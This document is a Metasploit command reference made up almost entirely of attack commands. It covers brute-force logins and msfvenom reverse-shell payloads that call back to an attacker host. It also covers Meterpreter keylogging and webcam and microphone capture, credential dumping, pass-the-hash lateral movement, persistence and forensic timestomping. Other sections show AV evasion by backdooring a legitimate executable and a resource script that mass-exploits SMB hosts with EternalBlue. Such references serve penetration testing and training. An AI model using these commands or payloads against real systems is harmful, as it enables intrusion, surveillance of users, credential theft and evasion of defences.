# Metasploit Framework Reference

A curated collection of Metasploit commands, payload generation techniques, and post-exploitation modules.

---

## Table of Contents

- [msfconsole Basics](#msfconsole-basics)
- [Auxiliary Modules (Recon)](#auxiliary-modules-recon)
- [Payload Generation with MSFVenom](#payload-generation-with-msfvenom)
- [Listener Setup (multi/handler)](#listener-setup-multihandler)
- [Meterpreter Basics](#meterpreter-basics)
- [Post-Exploitation Modules](#post-exploitation-modules)
- [Evasion & Encoding](#evasion--encoding)
- [Database Integration](#database-integration)
- [Resource Scripts (Automation)](#resource-scripts-automation)
- [Troubleshooting](#troubleshooting)

---

## msfconsole Basics

| Command | Purpose |
|---|---|
| `msfconsole` | Launch the Metasploit Framework |
| `help` | Display all available commands |
| `search [keyword]` | Search for modules (e.g., `search eternalblue`, `search type:auxiliary smb`) |
| `use [module]` | Select a module to use |
| `show options` | Display required parameters for the current module |
| `show payloads` | Show available payloads for the current exploit |
| `show targets` | Show supported target platforms |
| `set [OPTION] [value]` | Configure an option |
| `setg [OPTION] [value]` | Set an option globally across all modules |
| `unset [OPTION]` | Unset an option |
| `run` / `exploit` | Execute the selected module |
| `run -j` | Run the module as a background job |
| `sessions` | List all active sessions |
| `sessions -i [ID]` | Interact with a specific session |
| `sessions -k [ID]` | Kill a session |
| `jobs` | View all running background jobs |
| `kill [ID]` | Terminate a specific job |
| `back` | Exit the current module |
| `exit` / `quit` | Exit the framework |
| `save` | Save current settings (options, payloads) for future sessions |
| `load` | Load an external plugin (e.g., `load nessus`) |
| `unload` | Unload a plugin |

---

## Auxiliary Modules (Recon)

Metasploit isn't just for exploitation—it includes powerful scanning and enumeration modules.

### Port Scanning

```bash
# TCP SYN port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 10
run

# XMAS scan (stealth)
use auxiliary/scanner/portscan/xmas
set RHOSTS 192.168.1.100
run
```

### SMB Enumeration

```bash
# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# SMB anonymous share enumeration
use auxiliary/scanner/smb/smb_anonymous_share_bruteforce
set RHOSTS 192.168.1.100
run

# SMB share enumeration with credentials
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
set SMBUser <username>
set SMBPass <password>
run

# SMB user enumeration
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.100
set SMBUser <username>
set SMBPass <password>
run

# SMB login brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set THREADS 5
run
```

### SSH Enumeration

```bash
# SSH version detection
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SSH login brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
run
```

### FTP Enumeration

```bash
# FTP version detection
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

# FTP anonymous login check
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run
```

### HTTP Enumeration

```bash
# HTTP directory brute forcing
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set RPORT 80
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# HTTP header enumeration
use auxiliary/scanner/http/http_header
set RHOSTS 192.168.1.100
run
```

### LDAP Enumeration

```bash
# LDAP server detection
use auxiliary/scanner/ldap/ldap_version
set RHOSTS 192.168.1.0/24
run

# LDAP query
use auxiliary/scanner/ldap/ldap_login
set RHOSTS 192.168.1.100
set BASE_DN "dc=domain,dc=local"
set USERNAME <username>
set PASSWORD <password>
run
```

### SNMP Enumeration

```bash
# SNMP community string bruteforce
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
set COMMUNITIES public private
run

# SNMP device enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.100
set COMMUNITY public
run
```

### NetBIOS Enumeration

```bash
# NetBIOS name service scanner
use auxiliary/scanner/netbios/nbname
set RHOSTS 192.168.1.0/24
run
```

### RDP Enumeration

```bash
# RDP version detection
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run
```

---

## Payload Generation with MSFVenom

### Windows Payloads

```bash
# 64-bit Meterpreter reverse TCP (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe

# 32-bit Meterpreter reverse TCP (staged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe

# 64-bit Meterpreter reverse HTTPS (stageless)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<attacker_ip> LPORT=443 -f exe -o payload.exe

# PowerShell payload (runs in memory, no file on disk)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=4444 -f psh > payload.ps1

# VBS payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f vbs -o payload.vbs

# C# payload (for use with SharpLoader or similar)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f csharp -o payload.cs

# DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f dll -o payload.dll
```

### Linux Payloads

```bash
# 64-bit Meterpreter reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o payload.elf

# 64-bit reverse shell (non-Meterpreter)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o payload.elf

# 64-bit Meterpreter reverse HTTPS (stageless)
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=<attacker_ip> LPORT=443 -f elf -o payload.elf
```

### macOS Payloads

```bash
# 64-bit Meterpreter reverse TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f macho -o payload.macho

# 64-bit reverse shell
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f macho -o payload.macho
```

### Web Payloads

```bash
# PHP Meterpreter reverse TCP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw > payload.php

# PHP reverse shell (non-Meterpreter)
msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=4444 -f raw > payload.php

# ASP Meterpreter reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f asp -o payload.asp

# ASPX Meterpreter reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f aspx -o payload.aspx

# JSP Meterpreter reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw -o payload.jsp

# WAR (Java web application archive)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f war -o payload.war
```

### Android Payloads

```bash
# Android APK payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -o payload.apk
```

### Python Payloads

```bash
# Python reverse TCP
msfvenom -p python/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f raw > payload.py
```

### Staged vs Stageless Payloads

| Type | Payload Prefix | Description | Size |
|---|---|---|---|
| **Staged** | `windows/meterpreter/reverse_tcp` | Small initial stager downloads the rest | ~10-20KB |
| **Stageless** | `windows/meterpreter_reverse_tcp` | Entire payload in one file | ~200-500KB |

**Staged** payloads are smaller and better for limited space but require internet access to download the full payload.

**Stageless** payloads are larger but more reliable—no download is required after execution.

### Common MSFVenom Flags

| Flag | Description |
|---|---|
| `-p` | Specify the payload |
| `-f` | Specify the output format |
| `-o` | Specify output filename |
| `-e` | Specify encoder |
| `-i` | Number of encoding iterations |
| `-x` | Custom template file (masquerading) |
| `-b` | Bad characters to avoid |
| `-a` | Architecture (x86, x64) |
| `--platform` | Target platform (windows, linux, osx, etc.) |

### List of Common Output Formats

| Format | Extension | Use Case |
|---|---|---|
| `exe` | .exe | Windows executable |
| `elf` | .elf | Linux executable |
| `macho` | .macho | macOS executable |
| `dll` | .dll | Windows DLL |
| `vbs` | .vbs | Windows VBScript |
| `psh` | .ps1 | PowerShell script |
| `asp` | .asp | Classic ASP |
| `aspx` | .aspx | ASP.NET |
| `php` | .php | PHP script |
| `jsp` | .jsp | Java Server Pages |
| `war` | .war | Java web archive |
| `raw` | .py / .rb | Python / Ruby script |
| `csharp` | .cs | C# source code |
| `hex` | .txt | Hexadecimal representation |
| `bash` | .sh | Bash script |

---

## Listener Setup (multi/handler)

Once you've generated a payload, set up a listener to catch the incoming connection:

### Basic Listener

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

### Listener with Background Job

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run -j
```

### Listener with SSL/HTTPS

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <attacker_ip>
set LPORT 443
set SSL true
set SSLCert /path/to/cert.pem
run
```

### Persistent Listener (Automatically Restart on Session Drop)

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
set ExitOnSession false
run -j
```

---

## Meterpreter Basics

Once you've caught a session with `sessions -i [ID]`, use these commands:

### Essential Commands

| Command | Purpose |
|---|---|
| `help` | Show all available Meterpreter commands |
| `background` | Background the current session |
| `exit` | Terminate the session |
| `quit` | Terminate the session |
| `sessions` | List all active sessions |
| `sessions -i [ID]` | Switch to a different session |

### System Information

| Command | Purpose |
|---|---|
| `sysinfo` | Display OS, architecture, and system details |
| `getuid` | Show the current user context |
| `getprivs` | Display current privileges |
| `getsystem` | Attempt to escalate to SYSTEM |
| `pgrep [process]` | Get PID of a process by name (e.g., `pgrep explorer.exe`) |
| `ps` | List all running processes |
| `migrate [PID]` | Move to a different process (for stability/evasion) |
| `kill [PID]` | Terminate a process |

### File System

| Command | Purpose |
|---|---|
| `pwd` | Print current working directory |
| `cd [path]` | Change directory |
| `ls` | List files in current directory |
| `download [file]` | Download a file from the target |
| `upload [file]` | Upload a file to the target |
| `edit [file]` | Edit a file on the target |
| `search -f [pattern]` | Search for files (e.g., `search -f *.config`) |
| `rm [file]` | Delete a file |
| `rmdir [dir]` | Delete a directory |

### Networking

| Command | Purpose |
|---|---|
| `ipconfig` | Display network interfaces |
| `ifconfig` | Display network interfaces (alternative) |
| `route` | View routing table |
| `arp` | Display ARP table |
| `netstat` | Display active connections |
| `getproxy` | View proxy settings |
| `setproxy` | Set proxy settings |
| `portfwd add -L [local_ip] -l [local_port] -R [remote_port]` | Port forwarding |
| `portfwd list` | List active port forwards |
| `portfwd delete [ID]` | Remove a port forward |

### Interaction

| Command | Purpose |
|---|---|
| `shell` | Spawn a native Windows/Linux shell |
| `desktop` | Interact with the remote desktop (VNC) |
| `screenshot` | Capture a screenshot of the remote desktop |
| `record_mic` | Record audio from the target's microphone |
| `webcam_snap` | Take a picture from the target's webcam |
| `webcam_list` | List available webcams |

### Keylogging

| Command | Purpose |
|---|---|
| `keyscan_start` | Start capturing keystrokes |
| `keyscan_dump` | Display captured keystrokes |
| `keyscan_stop` | Stop capturing keystrokes |
| `idletime` | Check how long the user has been idle |

### Persistence

| Command | Purpose |
|---|---|
| `run persistence -h` | Show persistence options |
| `run persistence -X -i 10 -p 4444 -r <attacker_ip>` | Install persistent payload |
| `run post/windows/manage/smart_migrate` | Auto-migrate to a stable process |

### Registry

| Command | Purpose |
|---|---|
| `reg query` | Query a registry key |
| `reg set` | Set a registry value |
| `reg delete` | Delete a registry value |
| `reg create` | Create a registry key |
| `reg enumkey` | Enumerate registry subkeys |

### Timing

| Command | Purpose |
|---|---|
| `timestomp -f [file] -v [timestamp]` | Modify file timestamps (forensic evasion) |

### Helpful Meterpreter Scripts

```bash
# Automatically migrate to a stable process
run post/windows/manage/smart_migrate

# Check for common privilege escalation vulnerabilities
run post/windows/gather/enum_patches

# Check for AV/EDR
run post/windows/gather/enum_applications
```

---

## Post-Exploitation Modules

These run against an active session for deeper enumeration and persistence.

### Credential Dumping

```bash
# Dump password hashes from SAM
use post/windows/gather/hashdump
set SESSION 1
run

# Dump credentials from LSASS (mimikatz)
use post/windows/gather/credentials/windows_automatic_luid
set SESSION 1
run

# Dump credentials from LSASS (alternative)
load kiwi
creds_all
creds_kerberos
creds_msv
creds_ssp
creds_wdigest

# Dump cached credentials
use post/windows/gather/cachedump
set SESSION 1
run
```

### Domain Enumeration

```bash
# Enumerate domain information
use post/windows/gather/enum_domain
set SESSION 1
run

# Enumerate domain group memberships
use post/windows/gather/enum_domain_users
set SESSION 1
run

# Enumerate domain groups
use post/windows/gather/enum_domain_groups
set SESSION 1
run

# Enumerate domain computers
use post/windows/gather/enum_domain_computers
set SESSION 1
run

# Enumerate domain controllers
use post/windows/gather/enum_domain_controller
set SESSION 1
run

# Active Directory reconnaissance
use post/windows/gather/credentials/domain_hashdump
set SESSION 1
run
```

### Local Enumeration

```bash
# Enumerate installed applications
use post/windows/gather/enum_applications
set SESSION 1
run

# Enumerate logged-on users
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

# Enumerate system patches
use post/windows/gather/enum_patches
set SESSION 1
run

# Enumerate scheduled tasks
use post/windows/gather/enum_scheduled_tasks
set SESSION 1
run

# Enumerate services
use post/windows/gather/enum_services
set SESSION 1
run

# Enumerate installed security software (AV/EDR)
use post/windows/gather/enum_security_software
set SESSION 1
run

# Enumerate shares
use post/windows/gather/enum_shares
set SESSION 1
run

# Enumerate SNMP
use post/windows/gather/enum_snmp
set SESSION 1
run
```

### Network Enumeration

```bash
# Enumerate network interfaces
use post/windows/gather/enum_network
set SESSION 1
run

# Enumerate ARP table
use post/windows/gather/arp_scanner
set SESSION 1
set RHOSTS 192.168.1.0/24
run

# Enumerate hosts (via NetBIOS)
use post/windows/gather/netbios_scanner
set SESSION 1
set RHOSTS 192.168.1.0/24
run
```

### Persistence

```bash
# Install persistence (Meterpreter)
use post/windows/manage/persistence_exe
set SESSION 1
set LHOST <attacker_ip>
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
run

# Create scheduled task persistence
use post/windows/manage/scheduled_tasks
set SESSION 1
set LHOST <attacker_ip>
set LPORT 4444
run
```

### Lateral Movement

```bash
# Pass-the-hash with psexec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.101
set SMBUser <username>
set SMBPass <lm_hash>:<nt_hash>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run

# Pass-the-hash with wmiexec
use exploit/windows/smb/wmiexec
set RHOSTS 192.168.1.101
set SMBUser <username>
set SMBPass <lm_hash>:<nt_hash>
run

# Pass-the-hash with smbexec
use exploit/windows/smb/smbexec
set RHOSTS 192.168.1.101
set SMBUser <username>
set SMBPass <lm_hash>:<nt_hash>
run
```

### Linux Post-Exploitation

```bash
# Enumerate Linux system
use post/linux/gather/enum_configs
set SESSION 1
run

# Enumerate Linux network
use post/linux/gather/enum_network
set SESSION 1
run

# Enumerate Linux users
use post/linux/gather/enum_users
set SESSION 1
run

# Dump password hashes
use post/linux/gather/hashdump
set SESSION 1
run
```

---

## Evasion & Encoding

### Basic Encoding

```bash
# Single encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe

# Multiple encoder iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
```

### Common Encoders

| Encoder | Description |
|---|---|
| `x86/shikata_ga_nai` | Polymorphic XOR (most common) |
| `x86/bloxor` | Block-based XOR |
| `x86/jmp_call_additive` | Jump-Call-Additive |
| `x86/alpha_mixed` | Alphanumeric shellcode |
| `x86/xor_dynamic` | Dynamic XOR |
| `x86/countdown` | Countdown-based |
| `x86/avoid_underscore_tolower` | Avoid underscore and tolower |
| `x86/unicode_mixed` | Unicode encoding |

### Bad Character Filtering

```bash
# Specify bad characters to avoid
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -b "\x00\x0a\x0d\x20" -f exe -o payload.exe
```

Common bad characters:
| Char | Description |
|---|---|
| `\x00` | Null byte (terminates strings) |
| `\x0a` | Newline |
| `\x0d` | Carriage return |
| `\x20` | Space |
| `\x0b` | Vertical tab |
| `\x0c` | Form feed |
| `\x2f` | Forward slash |

### Template Masquerading

```bash
# Embed payload into a legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -x /path/to/putty.exe -f exe -o putty_backdoor.exe

# Multiple templates
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -x /path/to/putty.exe -k -f exe -o putty_backdoor.exe
# -k preserves the original template's functionality
```

### PowerShell Evasion

```bash
# Base64-encoded PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=443 -f psh -e x64/xor_dynamic -i 5 -o payload.ps1

# PowerShell with obfuscation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f psh-reflection -o payload.ps1
```

### Avoiding AV Detection (General Tips)

1. **Use stageless payloads** – fewer network signatures
2. **Use HTTPS or DNS for C2** – blends with normal traffic
3. **Use custom templates** – avoid default `msfvenom.exe` signatures
4. **Combine encoders** – `-e x86/shikata_ga_nai -e x86/bloxor`
5. **Use less common encoders** – `x86/countdown`, `x86/xor_dynamic`
6. **Pack with UPX** – `upx -9 payload.exe`
7. **Use `-f raw` and embed in custom shellcode loaders**
8. **Use `-f csharp` or `-f vb`** and compile with legitimate frameworks

### UPX Compression

```bash
# Compress the payload to reduce size and change signature
upx -9 payload.exe
```

---

## Database Integration

Metasploit can store scan results in a local database for easy reference.

### Setting Up the Database

```bash
# Start PostgreSQL
sudo systemctl start postgresql

# Create a database
msfdb init

# Check status
msfdb status
```

### Importing Scan Results

```bash
# Import Nmap XML
db_import /path/to/nmap_scan.xml

# Import Nessus scan
db_import /path/to/nessus_scan.nessus

# Import Nexpose scan
db_import /path/to/nexpose_scan.xml
```

### Querying the Database

```bash
# List all hosts
hosts

# List hosts with specific services
hosts -S http

# List all services
services

# List services on specific ports
services -p 445

# List services with specific name
services -s smb

# Show credentials stored in database
creds

# Show vulnerabilities
vulns

# Show loot (collected data from sessions)
loot
```

### Using Database with Modules

```bash
# Use hosts from database directly
use auxiliary/scanner/smb/smb_version
set RHOSTS file:/tmp/hosts.txt  # or use DB directly
hosts -R  # Set RHOSTS to all hosts in DB

# Use services from database
services -p 445 -R  # Set RHOSTS to all hosts with port 445 open
```

### Exporting Data

```bash
# Export hosts to file
hosts -o /tmp/hosts.txt

# Export services to file
services -o /tmp/services.txt
```

---

## Resource Scripts (Automation)

Resource scripts (`.rc` files) allow you to automate repetitive tasks.

### Basic Resource Script

```bash
# Create a resource script
cat > auto.rc << EOF
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
set ExitOnSession false
run -j
EOF

# Run the resource script
msfconsole -r auto.rc
```

### Advanced Resource Script with Auto-Exploit

```bash
cat > auto_exploit.rc << 'EOF'
# Configure database
db_connect msf

# Run an auxiliary module
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# Import results
services -p 445 -R

# Run exploit on all SMB hosts
use exploit/windows/smb/eternalblue_ms17_010
set RHOSTS file:/tmp/hosts.txt
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
run -j

# Start handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
run -j
EOF

msfconsole -r auto_exploit.rc
```

### Meterpreter Session Automation

```bash
# Automate post-exploitation on session creation
cat > auto_meterpreter.rc << 'EOF'
sessions -i 1
getuid
sysinfo
getsystem
hashdump
background
EOF
```

### Meterpreter Resource Scripts (within a session)

```bash
# Run within an active Meterpreter session
metsession -c "getuid; sysinfo; ps; getsystem"
```

### Common Automation Use Cases

| Use Case | Command |
|---|---|
| Auto-handler | `msfconsole -r handler.rc` |
| Auto-scan & exploit | `msfconsole -r full_scan.rc` |
| Post-exploitation collection | `msfconsole -r post_exploit.rc` |
| Batch credential testing | `msfconsole -r password_spray.rc` |

---

## Troubleshooting

### Common Issues and Solutions

| Issue | Solution |
|---|---|
| Payload doesn't connect | Check firewall, NAT, and routing. Ensure `LHOST` is correct and reachable |
| Session dies immediately | Use `migrate` to a more stable process (e.g., `explorer.exe`) |
| AV blocks payload | Use different encoders, templates, or stageless payloads |
| Encoder fails | Try a different encoder or use `-b` to specify bad characters |
| Payload too large | Use a staged payload or reduce encoding iterations |
| Database issues | Run `msfdb reinit` to reset the database |
| Module not found | Run `updatedb` or check your Metasploit installation |

---

## References

- [Official Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed (Offensive Security)](https://www.offensive-security.com/metasploit-unleashed/)
- [MSFVenom Cheat Sheet](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [InternalAllTheThings - Metasploit](https://swisskyrepo.github.io/InternalAllTheThings/command-control/metasploit/)

#metasploit #recon #exploitation #post-compromise